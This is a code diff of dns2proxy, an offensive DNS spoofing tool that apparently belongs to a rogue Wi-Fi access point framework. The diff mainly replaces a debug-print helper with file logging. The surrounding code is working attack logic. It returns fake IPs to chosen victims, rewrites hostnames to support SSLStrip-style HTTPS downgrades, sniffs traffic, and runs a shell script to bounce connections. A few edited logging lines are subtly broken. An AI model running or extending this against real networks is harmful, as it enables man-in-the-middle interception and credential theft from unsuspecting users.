@@ -30,8 +30,9 @@ import pcapy
 import os
 import signal
 import errno
-from time import sleep
+from time import sleep,asctime
 import argparse
+import logging
 
 
 consultas = {}
@@ -42,7 +43,7 @@ nospoof = []
 nospoofto = []
 victims = []
 
-LOGREQFILE = "Plugins/dns2proxy/dnslog.txt"
+LOGREQFILE = "./Logs/AccessPoint/dns2proxy.log"
 LOGSNIFFFILE = "Plugins/dns2proxy/snifflog.txt"
 LOGALERTFILE = "Plugins/dns2proxy/dnsalert.txt"
 RESOLVCONF = "Plugins/dns2proxy/resolv.conf"
@@ -94,11 +95,10 @@ def SIGUSR1_handle(signalnum, frame):
     global noserv
     global Resolver
     noserv = 0
-    DEBUGLOG('Reconfiguring....')
+    logdns2proxy.info('Reconfiguring....')
     process_files()
     Resolver.reset()
     Resolver.read_resolv_conf(RESOLVCONF)
-    return
 
 
 def process_files():
@@ -129,7 +129,7 @@ def process_files():
             continue
         h = line.split()
         if len(h) > 0:
-            DEBUGLOG('Non spoofing ' + h[0])
+            logdns2proxy.info('Non spoofing ' + h[0])
             nospoof.append(h[0])
 
     nsfile.close()
@@ -140,7 +140,7 @@ def process_files():
             continue
         h = line.split()
         if len(h) > 0:
-            DEBUGLOG('Spoofing only to ' + h[0])
+            logdns2proxy.info('Spoofing only to ' + h[0])
             victims.append(h[0])
 
     nsfile.close()
@@ -151,7 +151,7 @@ def process_files():
             continue
         h = line.split()
         if len(h) > 0:
-            DEBUGLOG('Non spoofing to ' + h[0])
+            logdns2proxy.info('Non spoofing to ' + h[0])
             nospoofto.append(h[0])
 
     nsfile.close()
@@ -162,7 +162,7 @@ def process_files():
             continue
         h = line.split()
         if len(h) > 1:
-            DEBUGLOG('Specific host spoofing ' + h[0] + ' with ' + h[1])
+            logdns2proxy.info('Specific host spoofing ' + h[0] + ' with ' + h[1])
             spoof[h[0]] = h[1]
 
     nsfile.close()
@@ -172,7 +172,7 @@ def process_files():
             continue
         h = line.split()
         if len(h) > 1:
-            DEBUGLOG('Specific domain IP ' + h[0] + ' with ' + h[1])
+            logdns2proxy.info('Specific domain IP ' + h[0] + ' with ' + h[1])
             dominios[h[0]] = h[1]
 
     nsfile.close()
@@ -191,12 +191,6 @@ def process_files():
     return
 
 
-def DEBUGLOG(str):
-    global debug
-    if debug:
-        print str
-    return
-
 
 def handler_msg(id):
     #os.popen('executeScript %s &'%id)
@@ -211,7 +205,7 @@ class ThreadSniffer(threading.Thread):
         threading.Thread.__init__(self)
 
     def run(self):
-        #DEBUGLOG( self.getName(), " Sniffer Waiting connections....")
+        logdns2proxy.info( self.getName(), " Sniffer Waiting connections....")
         go()
 
 def go():
@@ -221,7 +215,7 @@ def go():
         ip1, ip1, adminip)
     cap = pcapy.open_live(dev, 255, 1, 0)
     cap.setfilter(bpffilter)
-    DEBUGLOG( "Starting sniffing in (%s = %s)...." % (dev, ip1))
+    logdns2proxy.info( "Starting sniffing in (%s = %s)...." % (dev, ip1))
 
     #start sniffing packets
     while True:
@@ -230,7 +224,7 @@ def go():
             parse_packet(packet)
         except:
             pass
-            #DEBUGLOG( ('%s: captured %d bytes, truncated to %d bytes' %(datetime.datetime.now(), header.getlen(), header.getcaplen())))
+            #logdns2proxy.info( ('%s: captured %d bytes, truncated to %d bytes' %(datetime.datetime.now(), header.getlen(), header.getcaplen())))
 
 #function to parse a packet
 def parse_packet(packet):
@@ -280,8 +274,8 @@ def parse_packet(packet):
 
 
             if consultas.has_key(str(s_addr)):
-                DEBUGLOG(' ==> Source Address : ' + str(s_addr) + ' *  Destination Address : ' + str(d_addr))
-                DEBUGLOG(' Source Port : ' + str(source_port) + ' *  Dest Port : ' + str(dest_port))
+                logdns2proxy.info(' ==> Source Address : ' + str(s_addr) + ' *  Destination Address : ' + str(d_addr))
+                logdns2proxy.info(' Source Port : ' + str(source_port) + ' *  Dest Port : ' + str(dest_port))
                 #            	print '>>>>  '+str(s_addr)+' esta en la lista!!!!.....'
                 comando = 'sh ./IPBouncer.sh %s %s %s %s' % (
                     ip2, str(dest_port), consultas[str(s_addr)], str(dest_port))
@@ -306,7 +300,7 @@ def parse_packet(packet):
             #dest_port = udph[1]
             #length = udph[2]
             #checksum = udph[3]
-            #DEBUGLOG('Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(length) + ' Checksum : ' + str(checksum))
+            #logdns2proxy.info('Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(length) + ' Checksum : ' + str(checksum))
             #h_size = eth_length + iph_length + udph_length
             #data_size = len(packet) - h_size
             #get data from the packet
@@ -320,11 +314,11 @@ def parse_packet(packet):
 def respuestas(name, type):
     global Resolver
 
-    DEBUGLOG('Query = ' + name + ' ' + type)
+    logdns2proxy.info('Query = ' + name + ' ' + type)
     try:
         answers = Resolver.query(name, type)
     except Exception, e:
-        DEBUGLOG('Exception...')
+        logdns2proxy.info('Exception...')
         return 0
     return answers
 
@@ -334,12 +328,12 @@ def requestHandler(address, message):
     dosleep = False
     try:
         message_id = ord(message[0]) * 256 + ord(message[1])
-        DEBUGLOG('msg id = ' + str(message_id))
+        logdns2proxy.info('msg id = ' + str(message_id))
         if message_id in serving_ids:
-            DEBUGLOG('I am already serving this request.')
+            logdns2proxy.info('I am already serving this request.')
             return
         serving_ids.append(message_id)
-        DEBUGLOG('Client IP: ' + address[0])
+        logdns2proxy.info('Client IP: ' + address[0])
         prov_ip = address[0]
         try:
             msg = dns.message.from_wire(message)
@@ -350,22 +344,22 @@ def requestHandler(address, message):
                     qs = msg.question
                     if len(qs) > 0:
                         q = qs[0]
-                        DEBUGLOG('request is ' + str(q))
+                        logdns2proxy.info('request is ' + str(q))
                         save_req(LOGREQFILE, 'Client IP: ' + address[0] + '    request is    ' + str(q) + '\n')
                         if q.rdtype == dns.rdatatype.A:
-                            DEBUGLOG('Doing the A query....')
+                            logdns2proxy.info('Doing the A query....')
                             resp, dosleep = std_A_qry(msg, prov_ip)
                         elif q.rdtype == dns.rdatatype.PTR:
-                            #DEBUGLOG('Doing the PTR query....')
+                            #logdns2proxy.info('Doing the PTR query....')
                             resp = std_PTR_qry(msg)
                         elif q.rdtype == dns.rdatatype.MX:
-                            DEBUGLOG('Doing the MX query....')
+                            logdns2proxy.info('Doing the MX query....')
                             resp = std_MX_qry(msg)
                         elif q.rdtype == dns.rdatatype.TXT:
-                            #DEBUGLOG('Doing the TXT query....')
+                            #logdns2proxy.info('Doing the TXT query....')
                             resp = std_TXT_qry(msg)
                         elif q.rdtype == dns.rdatatype.AAAA:
-                            #DEBUGLOG('Doing the AAAA query....')
+                            #logdns2proxy.info('Doing the AAAA query....')
                             resp = std_AAAA_qry(msg)
                         else:
                             # not implemented
@@ -375,16 +369,16 @@ def requestHandler(address, message):
                     resp = make_response(qry=msg, RCODE=4)  # RCODE =  4    Not Implemented
 
             except Exception, e:
-                DEBUGLOG('got ' + repr(e))
+                logdns2proxy.info('got ' + repr(e))
                 resp = make_response(qry=msg, RCODE=2)  # RCODE =  2    Server Error
-                DEBUGLOG('resp = ' + repr(resp.to_wire()))
+                logdns2proxy.info('resp = ' + repr(resp.to_wire()))
         except Exception, e:
-            DEBUGLOG('got ' + repr(e))
+            logdns2proxy.info('got ' + repr(e))
             resp = make_response(id=message_id, RCODE=1)  # RCODE =  1    Format Error
-            DEBUGLOG('resp = ' + repr(resp.to_wire()))
+            logdns2proxy.info('resp = ' + repr(resp.to_wire()))
     except Exception, e:
         # message was crap, not even the ID
-        DEBUGLOG('got ' + repr(e))
+        logdns2proxy.info('got ' + repr(e))
 
     if resp:
         s.sendto(resp.to_wire(), address)
@@ -393,18 +387,18 @@ def requestHandler(address, message):
 
 def std_PTR_qry(msg):
     qs = msg.question
-    DEBUGLOG( str(len(qs)) + ' questions.')
+    logdns2proxy.info( str(len(qs)) + ' questions.')
     iparpa = qs[0].to_text().split(' ', 1)[0]
-    DEBUGLOG('Host: ' + iparpa)
+    logdns2proxy.info('Host: ' + iparpa)
     resp = make_response(qry=msg)
     hosts = respuestas(iparpa[:-1], 'PTR')
     if isinstance(hosts, numbers.Integral):
-        DEBUGLOG('No host....')
+        logdns2proxy.info('No host....')
         resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
         return resp
 
     for host in hosts:
-        DEBUGLOG('Adding ' + host.to_text())
+        logdns2proxy.info('Adding ' + host.to_text())
         rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.PTR, host.to_text())
         resp.answer.append(rrset)
 
@@ -413,21 +407,21 @@ def std_PTR_qry(msg):
 
 def std_MX_qry(msg):
     qs = msg.question
-    DEBUGLOG(str(len(qs)) + ' questions.')
+    logdns2proxy.info(str(len(qs)) + ' questions.')
     iparpa = qs[0].to_text().split(' ', 1)[0]
-    DEBUGLOG('Host: ' + iparpa)
+    logdns2proxy.info('Host: ' + iparpa)
     resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
     return resp
     #Temporal disable MX responses
     resp = make_response(qry=msg)
     hosts = respuestas(iparpa[:-1], 'MX')
     if isinstance(hosts, numbers.Integral):
-        DEBUGLOG('No host....')
+        logdns2proxy.info('No host....')
         resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
         return resp
 
     for host in hosts:
-        DEBUGLOG('Adding ' + host.to_text())
+        logdns2proxy.info('Adding ' + host.to_text())
         rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.MX, host.to_text())
         resp.answer.append(rrset)
 
@@ -448,13 +442,13 @@ def std_TXT_qry(msg):
     spfresponse = ''
     if (dominio in dominios) or (host in dominios):
         ttl = 1
-        DEBUGLOG('Alert domain! (TXT) ID: ' + host)
+        logdns2proxy.info('Alert domain! (TXT) ID: ' + host)
         # Here the HANDLE!
         #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
         save_req(LOGALERTFILE, 'Alert domain! (TXT) ID: ' + host+ '\n')
         if host in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%host
         if dominio in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%dominio
-        DEBUGLOG('Responding with SPF = ' + spfresponse)
+        logdns2proxy.info('Responding with SPF = ' + spfresponse)
         rrset = dns.rrset.from_text(iparpa, ttl, dns.rdataclass.IN, dns.rdatatype.TXT, spfresponse)
         resp.answer.append(rrset)
         return resp
@@ -486,13 +480,13 @@ def std_SPF_qry(msg):
     # host = "."+host
     # if (dominio in dominios) or (host in dominios):
     #     ttl = 1
-    #     DEBUGLOG('Alert domain! (TXT) ID: ' + host)
+    #     logdns2proxy.info('Alert domain! (TXT) ID: ' + host)
     #     # Here the HANDLE!
     #     #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
     #     save_req(LOGALERTFILE, 'Alert domain! (TXT) ID: ' + host+ '\n')
     #     if host in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%host
     #     if dominio in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%dominio
-    #     DEBUGLOG('Responding with SPF = ' + spfresponse)
+    #     logdns2proxy.info('Responding with SPF = ' + spfresponse)
     #     rrset = dns.rrset.from_text(iparpa, ttl, dns.rdataclass.IN, dns.rdatatype.TXT, spfresponse)
     #     resp.answer.append(rrset)
     #     return resp
@@ -513,23 +507,23 @@ def std_SPF_qry(msg):
 
 def std_AAAA_qry(msg):
     if not Forward:
-        DEBUGLOG('No host....')
+        logdns2proxy.info('No host....')
         resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
         return resp
     qs = msg.question
-    DEBUGLOG(str(len(qs)) + ' questions.')
+    logdns2proxy.info(str(len(qs)) + ' questions.')
     iparpa = qs[0].to_text().split(' ', 1)[0]
-    DEBUGLOG('Host: ' + iparpa)
+    logdns2proxy.info('Host: ' + iparpa)
     resp = make_response(qry=msg)
     hosts = respuestas(iparpa[:-1], 'AAAA')
 
     if isinstance(hosts, numbers.Integral):
-        DEBUGLOG('No host....')
+        logdns2proxy.info('No host....')
         resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
         return resp
 
     for host in hosts:
-        DEBUGLOG('Adding ' + host.to_text())
+        logdns2proxy.info('Adding ' + host.to_text())
         rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.AAAA, host.to_text())
         resp.answer.append(rrset)
 
@@ -543,11 +537,11 @@ def std_A_qry(msg, prov_ip):
 
     dosleep = False
     qs = msg.question
-    DEBUGLOG(str(len(qs)) + ' questions.')
+    logdns2proxy.info(str(len(qs)) + ' questions.')
     resp = make_response(qry=msg)
     for q in qs:
         qname = q.name.to_text()[:-1]
-        DEBUGLOG('q name = ' + qname)
+        logdns2proxy.info('q name = ' + qname)
 
         host = qname.lower()
 
@@ -575,12 +569,12 @@ def std_A_qry(msg, prov_ip):
                 dominio = dom1
 
             if not id=='www':
-                DEBUGLOG('Alert domain! ID: ' + id)
+                logdns2proxy.info('Alert domain! ID: ' + id)
                 # Here the HANDLE!
                 #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
                 handler_msg(id)
                 save_req(LOGALERTFILE, 'Alert domain! ID: ' + id + '\n')
-            DEBUGLOG('Responding with IP = ' + dominios[dominio])
+            logdns2proxy.info('Responding with IP = ' + dominios[dominio])
             rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[dominio])
             resp.answer.append(rrset)
             return resp, dosleep
@@ -588,7 +582,7 @@ def std_A_qry(msg, prov_ip):
         if ".%s"%host in dominios:
             dominio = ".%s"%host
             ttl = 1
-            DEBUGLOG('Responding with IP = ' + dominios[dominio])
+            logdns2proxy.info('Responding with IP = ' + dominios[dominio])
             rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[dominio])
             resp.answer.append(rrset)
             return resp, dosleep
@@ -602,13 +596,13 @@ def std_A_qry(msg, prov_ip):
                     host2 = transformation[from_host]+host.split(from_host)[1]
                     break
             if host2 != '':
-                DEBUGLOG('SSLStrip transforming host: %s => %s ...' % (host, host2))
+                logdns2proxy.info('SSLStrip transforming host: %s => %s ...' % (host, host2))
                 ips = respuestas(host2, 'A')
 
         #print '>>> Victim: %s   Answer 0: %s'%(prov_ip,prov_resp)
 
         if isinstance(ips, numbers.Integral):
-            DEBUGLOG('No host....')
+            logdns2proxy.info('No host....')
             resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
             return resp, dosleep
 
@@ -620,7 +614,7 @@ def std_A_qry(msg, prov_ip):
             if host in spoof:
                 save_req(LOGREQFILE, '!!! Specific host (' + host + ') asked....\n')
                 for spoof_ip in spoof[host].split(","):
-                    DEBUGLOG('Adding fake IP = ' + spoof_ip)
+                    logdns2proxy.info('Adding fake IP = ' + spoof_ip)
                     rrset = dns.rrset.from_text(q.name, 1000, dns.rdataclass.IN, dns.rdatatype.A, spoof_ip)
                     resp.answer.append(rrset)
                 return resp, dosleep
@@ -629,34 +623,34 @@ def std_A_qry(msg, prov_ip):
                 #print 'DEBUG: Adding consultas[%s]=%s'%(prov_ip,prov_resp)
                 if ip1 is not None:
                     rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, ip1)
-                    DEBUGLOG('Adding fake IP = ' + ip1)
+                    logdns2proxy.info('Adding fake IP = ' + ip1)
                     resp.answer.append(rrset)
                 if ip2 is not None:
                     #Sleep only when using global resquest matrix
                     dosleep = True
                     rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, ip2)
-                    DEBUGLOG('Adding fake IP = ' + ip2)
+                    logdns2proxy.info('Adding fake IP = ' + ip2)
                     resp.answer.append(rrset)
                 if len(fake_ips)>0:
                     for fip in fake_ips:
                         rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, fip)
-                        DEBUGLOG('Adding fake IP = ' + fip)
+                        logdns2proxy.info('Adding fake IP = ' + fip)
                         resp.answer.append(rrset)
 
         if not Forward and prov_ip not in nospoofto:
             if len(fake_ips) == 0:
-                DEBUGLOG('No forwarding....')
+                logdns2proxy.info('No forwarding....')
                 resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
             elif len(fake_ips) > 0:
-                DEBUGLOG('No forwarding (but adding fake IPs)...')
+                logdns2proxy.info('No forwarding (but adding fake IPs)...')
                 for fip in fake_ips:
                     rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, fip)
-                    DEBUGLOG('Adding fake IP = ' + fip)
+                    logdns2proxy.info('Adding fake IP = ' + fip)
                     resp.answer.append(rrset)
             return resp, dosleep
 
         for realip in ips:
-            DEBUGLOG('Adding real IP  = ' + realip.to_text())
+            logdns2proxy.info('Adding real IP  = ' + realip.to_text())
             rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, realip.to_text())
             resp.answer.append(rrset)
 
@@ -665,7 +659,7 @@ def std_A_qry(msg, prov_ip):
 
 # def std_A2_qry(msg):
 # 	qs = msg.question
-# 	DEBUGLOG(str(len(qs)) + ' questions.')
+# 	logdns2proxy.info(str(len(qs)) + ' questions.')
 # 	iparpa = qs[0].to_text().split(' ',1)[0]
 # 	print 'Host: '+ iparpa
 # 	resp = make_response(qry=msg)
@@ -676,14 +670,14 @@ def std_A_qry(msg, prov_ip):
 def std_ASPOOF_qry(msg):
     global spoof
     qs = msg.question
-    DEBUGLOG(str(len(qs)) + ' questions.')
+    logdns2proxy.info(str(len(qs)) + ' questions.')
     iparpa = qs[0].to_text().split(' ', 1)[0]
-    DEBUGLOG('Host: ' + iparpa)
+    logdns2proxy.info('Host: ' + iparpa)
     resp = make_response(qry=msg)
 
     for q in qs:
         qname = q.name.to_text()[:-1]
-        DEBUGLOG('q name = ' + qname) + ' to resolve ' + spoof[qname]
+        logdns2proxy.info('q name = ' + qname) + ' to resolve ' + spoof[qname]
         # 	    rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.facebook.com.')
         # 		resp.answer.append(rrset)
         # 		rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.yahoo.com.')
@@ -714,19 +708,34 @@ def make_response(qry=None, id=None, RCODE=0):
     return resp
 
 
+'''http://stackoverflow.com/questions/17035077/python-logging-to-multiple-log-files-from-different-classes'''
+def setup_logger(logger_name, log_file, level=logging.INFO):
+    l = logging.getLogger(logger_name)
+    formatter = logging.Formatter('%(asctime)s : %(message)s')
+    fileHandler = logging.FileHandler(log_file, mode='a')
+    fileHandler.setFormatter(formatter)
+    streamHandler = logging.StreamHandler()
+    streamHandler.setFormatter(formatter)
+
+    l.setLevel(level)
+    l.addHandler(fileHandler)
+    l.addHandler(streamHandler)
+
+setup_logger('Dns2Proxy', './Logs/AccessPoint/dns2proxy.log')
+logdns2proxy = logging.getLogger('Dns2Proxy')
+logdns2proxy.info('---[ Start Dns2proxy '+asctime()+']---')
 process_files()
 Resolver.reset()
 Resolver.read_resolv_conf(RESOLVCONF)
-signal.signal(signal.SIGUSR1, SIGUSR1_handle)
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind(('', 53))
 if Forward:
-    DEBUGLOG('DNS Forwarding activado....')
+    logdns2proxy.info('DNS Forwarding activado....')
 else:
-    DEBUGLOG('DNS Forwarding desactivado....')
+    logdns2proxy.info('DNS Forwarding desactivado....')
 
-DEBUGLOG('binded to UDP port 53.')
+logdns2proxy.info('binded to UDP port 53.')
 serving_ids = []
 noserv = True
 
@@ -736,7 +745,7 @@ if ip1 is not None and ip2 is not None and Forward:
 
 while True:
     if noserv:
-        DEBUGLOG('waiting requests.')
+        logdns2proxy.info('waiting requests.')
 
     try:
         message, address = s.recvfrom(1024)
@@ -744,7 +753,8 @@ while True:
     except socket.error as (code, msg):
         if code != errno.EINTR:
             raise
+        break
 
     if noserv:
-        DEBUGLOG('serving a request.')
+        logdns2proxy.info('serving a request.')
         requestHandler(address, message)
